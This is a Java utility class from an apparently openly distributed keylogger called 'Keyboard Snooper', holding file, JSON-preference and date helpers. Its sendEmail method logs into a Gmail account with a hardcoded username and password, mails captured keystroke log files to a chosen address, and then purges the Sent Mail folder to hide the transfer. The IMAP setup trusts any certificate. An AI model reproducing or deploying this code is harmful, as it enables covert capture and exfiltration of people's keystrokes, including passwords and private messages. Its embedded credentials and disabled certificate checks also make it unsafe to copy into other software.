package com.snooper;

import com.snooper.tray.*;

import java.util.*;
import java.io.*;
import java.text.*;
import javax.swing.*;
import java.net.*;
import java.awt.*;

import java.util.regex.*;
import javax.mail.*;
import javax.activation.*;
import javax.mail.internet.*;
import java.util.concurrent.*;
import javafx.scene.*;
import javafx.scene.control.*;

import com.google.gson.Gson;

public class Util {
	
	public static final Pattern VALID_EMAIL_ADDRESS_REGEX = 
		Pattern.compile("^[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]{2,6}$", Pattern.CASE_INSENSITIVE);
	
	//create a file in the disk
	public static File createFile(String filename) {
		File file = new File(filename);
		checkParentFile(file);
		try {
			if (file.createNewFile()) {
				System.out.println("File created: " + filename);
			} else {
				System.out.println("Error creating file: " + filename);
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		return file;
	}
	
	public static void checkParentFile(File file) {
		File parentFile = file.getParentFile();
		try {
			if (parentFile != null) {
				parentFile.mkdirs();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	//get the current date within the given format
	public static String getCurrentDate(String format) {
		return toString(new Date(), format);
	}
	
	//converts the string to file and pass it to hasInstance(File file) method
	public static boolean hasInstance(String filePath) {
		return hasInstance(new File(filePath));
	}
	
	//checks if the file has already been created
	public static boolean hasInstance(File file) {
		if (file.exists()) {
			return true;
		}
		
		return false;
	}
	
	public static String getHourly() {
		return "Hourly update as of: " + Util.getCurrentDate(Snooper.perHourFormat);
	}
	
	public static void goLink(String link) {
		try {
			Desktop.getDesktop().browse(new URI(link));
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static boolean serialize_json(Serializable serializable, String filepath) {
		Gson gson = new Gson();
		File file = new File(filepath + (filepath.contains(".json") ? "" : ".json"));
		checkParentFile(file);
		
		try (BufferedWriter writer = new BufferedWriter(new FileWriter(file))) {
			gson.toJson(serializable, writer);
		} catch (Exception ex) {
			ex.printStackTrace();
			return false;
		}
		
		return true;
	}
	
	public static <T>T deserialize_json(Class<T> c, String filepath) {
		Gson gson = new Gson();
		try (BufferedReader reader = new BufferedReader(new FileReader(filepath + (filepath.contains(".json") ? "" : ".json")))) {
			return gson.fromJson(reader,c);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		return null;
	}
	
	public static Pref loadPref() {
		Pref pref = deserialize_json(Pref.class, Snooper.PREF_FILEPATH);
		if (pref == null) {
			pref = createPref();
		}
		return pref;
	}
	
	public static boolean savePref(Pref pref) {
		if (pref == null) return false;
		
		serialize_json(pref,Snooper.PREF_FILEPATH);
		return true;
	}
	
	public static Pref createPref() {
		Pref pref = new Pref();
		serialize_json(pref,Snooper.PREF_FILEPATH);
		return pref;
	}
	
	public static void notif(String message) {
		notif(Snooper.TITLE, message);
	}
	
	public static void notif(String title, String message) {
		Snooper snooper = Snooper.getInstance();
		Pref pref = snooper.getPref();
		pref.notif(snooper.getTrayIcon(), title, message);
	}
	
	public static File[] getFiles(String parentDir, String extension) {
		return getFiles(new File(parentDir), extension);
	}
	
	public static File[] getFiles(File parentDir, String extension) {
		return parentDir.listFiles((dir,name) -> {
			return name.toLowerCase().endsWith(extension);
		});
	}
	
	public static File[] getSLogFiles(File parentDir) {
		return getFiles(parentDir, Snooper.EXTENSION_NAME);
	}
	
	public static File[] getSLogFiles(String parentDir) {
		return getSLogFiles(new File(parentDir));
	}
	
	//optional to reverse array
	public static <T> void reverse(T[] array) {
		Collections.reverse(Arrays.asList(array));
	}
	
	public static boolean tryParseInt(String value) {
		try {
			Integer.parseInt(value);
			return true;
		} catch (Exception e) {
			e.printStackTrace();
			return false;
		}
	}
	
	public static boolean withinRange(int bound1, int bound2, int test) {
		if (test >= bound1 && test <= bound2) return true;
		if (test <= bound1 && test >= bound2) return true;
		return false;
	}
	
	public static Date toDate(String dateString, String format) {
		Date date = null;
		try {
			DateFormat dateFormat = new SimpleDateFormat(format);
			date = dateFormat.parse(dateString);
		} catch (Exception ex) {
			ex.printStackTrace();
		}
		
		return date;
	}
	
	public static String toString(Date date, String format) {
		if (date == null) return "DATE_ERROR"; //fix if date is null just return DATE_ERROR
		DateFormat dateFormat = new SimpleDateFormat(format);
		return dateFormat.format(date);
	}
	
	//date in string to another format in string
	public static String toString(String dateString, String formatParse, String formatTo) {
		Date date = toDate(dateString,formatParse);
		return toString(date,formatTo);
	}
	
	public static Image createAwtImage(String path, String description) {
		return (new ImageIcon(path,description)).getImage();
	}
	
	public static javafx.scene.image.Image createJavaFXImage(String path) {
		return new javafx.scene.image.Image("file:" + path);
	}
	
	public static void openFileDefault(File file) {
		try {
			Desktop.getDesktop().open(file);
		} catch (Exception ex) {
			Util.notif(Snooper.TITLE, "Error opening current log...");
		}
	}
	
	public static boolean isEmailValid(String string) {
		Matcher matcher = VALID_EMAIL_ADDRESS_REGEX.matcher(string);
		return matcher.find();
	}
	
	public static void sendEmail(String to, String subjectText, String messageText, SLogFile sLogFile) {
		String from = "keyboardsnooper@gmail.com";
		String username = "keyboardsnooper";
		String password = "keyboardsnooperpassword";
		
		Properties props = System.getProperties();
		props.put("mail.smtp.auth", "true");
		props.put("mail.smtp.host", "smtp.gmail.com");
		props.put("mail.smtp.port", "587");
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.ssl.trust", "smtp.gmail.com");
		props.put("mail.smtp.socketFactory.class", "javax.net.ssl.SSLSocketFactory");
		
		Session session = Session.getInstance(props,
			new javax.mail.Authenticator() {
				protected javax.mail.PasswordAuthentication getPasswordAuthentication() {
					return new javax.mail.PasswordAuthentication(username,password);
				}
		});
		
		try {
			Message message = new MimeMessage(session);
			message.setFrom(new InternetAddress(from));
			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(to));
			
			//set subject and message
			message.setSubject(subjectText);
			BodyPart messageBodyPart = new MimeBodyPart();
			messageBodyPart.setText(messageText);
			Multipart multipart = new MimeMultipart();
			multipart.addBodyPart(messageBodyPart);
			
			//attach file
			messageBodyPart = new MimeBodyPart();
			String filename = sLogFile.getFilepath();
			DataSource source = new FileDataSource(filename);
			messageBodyPart.setDataHandler(new DataHandler(source));
			messageBodyPart.setFileName(sLogFile.getFilename());
			multipart.addBodyPart(messageBodyPart);
			
			message.setContent(multipart);
			
			//send the complete message
			Transport.send(message);
			Util.notif(Snooper.TITLE, "Sent message successfully...");
			
			//we want to delete emails in sent folder
			deleteEmails("[Gmail]/Sent Mail", username, password);
			//end delete email
			
		} catch (Exception e) {
			Util.notif(Snooper.TITLE, "Problem sending message...");
		}
	}
	
	//delete emails on specific folder
	//https://www.tutorialspoint.com/javamail_api/javamail_api_deleting_emails.htm
	public static void deleteEmails(String folder, String user, String password) {
		
		String imapHost = "imap.gmail.com";
		String storeType = "imaps";
		
		// get the session object
        try {
			Properties properties = new Properties();
			properties.put("mail.store.protocol", storeType);
			properties.put("mail.imaps.host", imapHost);
			properties.put("mail.imaps.port","993");
			properties.put("mail.imaps.auth","true");
			properties.put("mail.imaps.ssl.trust","*");
			properties.put("mail.imaps.starttls.enable", "true");
			Session emailSession = Session.getDefaultInstance(properties);
			
			Store store = emailSession.getStore(storeType);
			store.connect(imapHost, user, password);
			Folder[] f = store.getDefaultFolder().list();
			for(Folder fd:f) {
				Folder[] fc = fd.list();
				for (Folder fc1 : fc) {
					System.out.println(fc1);
				}
			}
			
			Folder emailFolder = store.getFolder(folder);
			emailFolder.open(Folder.READ_WRITE);
			
			/*Use this to check all folder
			Message[] messages = emailFolder.getMessages();
			System.out.println("MESSAGES: " + messages.length);
			for (int i = 0; i < messages.length; i++) {
				Message message = messages[i];
				message.setFlag(Flags.Flag.DELETED, true);
			}
			*/
			
			//closes all messages marked deleted
			emailFolder.close(true);
			store.close();
			
			
			Util.notif("Emails deleted successfully...");
		} catch (Exception ex) {
			Util.notif("Problem deleting emails...");
			ex.printStackTrace();
		}
	}
	
	public static void sendEmailSnoopLog(String to, SLogFile sLogFile) {
		sendEmail(
			to,
			"Keyboard Snooper (SnoopLog by " + Snooper.getInstance().getPref().getNickname() + "): " + sLogFile.getDate(),
			"Support me on patreon: https://patreon.com/doppelgunner \nor through paypal: https://www.paypal.me/doppelgunner",
			sLogFile
		);
	}
	
	public static long getMinutes(long time) {
		return TimeUnit.MILLISECONDS.toMinutes(time);
	}
	
	public static long getMinutesStarting(long from, long to) {
		return TimeUnit.MILLISECONDS.toMinutes(to - from);
	}
	
	public static void addTooltip(Node node, String msg) {
		Tooltip tooltip = new Tooltip(msg);
		Tooltip.install(node,tooltip);
	}
	
	public static String removeExtension(String filename) {
		int pos = filename.lastIndexOf(".");
		if (pos > 0) {
			return filename.substring(0, pos);
		}
		
		return null;
	}
}